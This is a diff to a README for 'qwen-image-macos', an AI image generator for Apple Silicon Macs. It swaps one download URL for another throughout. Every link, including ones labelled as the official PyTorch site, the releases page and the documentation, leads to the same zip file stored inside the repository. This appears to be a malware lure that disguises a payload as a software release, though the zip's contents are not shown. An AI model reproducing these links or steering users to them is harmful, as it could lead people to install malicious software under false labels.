@@ -4,14 +4,14 @@
 Welcome to qwen-image-macos! This application helps you create stunning images using AI technology on your Apple Silicon Mac. No complicated setups or technical skills needed. Enjoy fast and efficient image generation with ease.
 
 ## 🔗 Download Here
-[![Download qwen-image-macos](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip%https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip)](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip)
+[![Download qwen-image-macos](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip%https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip)](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip)
 
 ## 🖥️ System Requirements
 - **Operating System:** macOS on Apple Silicon (M1, M2, M3)
 - **RAM:** Minimum 8 GB recommended
 - **Disk Space:** At least 500 MB of free space required
 - **Python:** Version 3.8 or higher
-- **PyTorch:** Ensure the latest compatible version for Mac as per the [official PyTorch website](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip).
+- **PyTorch:** Ensure the latest compatible version for Mac as per the [official PyTorch website](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip).
 
 ## 📦 Features
 - **AI-powered Image Generation:** Easily generate images with advanced AI algorithms.
@@ -23,11 +23,11 @@ Welcome to qwen-image-macos! This application helps you create stunning images u
 To download and install **qwen-image-macos**, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the release page.
-   [Visit the Releases Page](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip)
+   [Visit the Releases Page](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip)
 
 2. **Select the Latest Release**: Look for the latest version available. This will usually be at the top of the list.
 
-3. **Download the Application**: Click on the asset link that suits your setup. Usually, it will be labeled similar to `https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip`.
+3. **Download the Application**: Click on the asset link that suits your setup. Usually, it will be labeled similar to `https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip`.
 
 4. **Unzip the File**: Once the download is complete, locate the `.zip` file in your Downloads folder. Double-click to unzip it.
 
@@ -58,12 +58,12 @@ If you encounter any issues, here are some common solutions:
 ## 🌟 Additional Resources
 For further assistance or to join a community of users, check out these links:
 
-- **Documentation**: [qwen-image Documentation](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip)
+- **Documentation**: [qwen-image Documentation](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip)
 - **Community Forum**: Join discussions and get help from other users.
 - **Feedback**: We love hearing from our users! Please report any bugs or suggestions to enhance the tool.
 
 ## 🔗 Download Here Again
 For your convenience, here's the download link one more time: 
-[![Download qwen-image-macos](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip%https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip)](https://raw.githubusercontent.com/Seyee435/qwen-image-macos/main/musculoelastic/qwen-image-macos.zip)
+[![Download qwen-image-macos](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip%https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip)](https://github.com/Seyee435/qwen-image-macos/raw/refs/heads/main/external/qwen_image_macos_3.7.zip)
 
 Thank you for choosing **qwen-image-macos** for your image generation needs! Enjoy your creative journey.
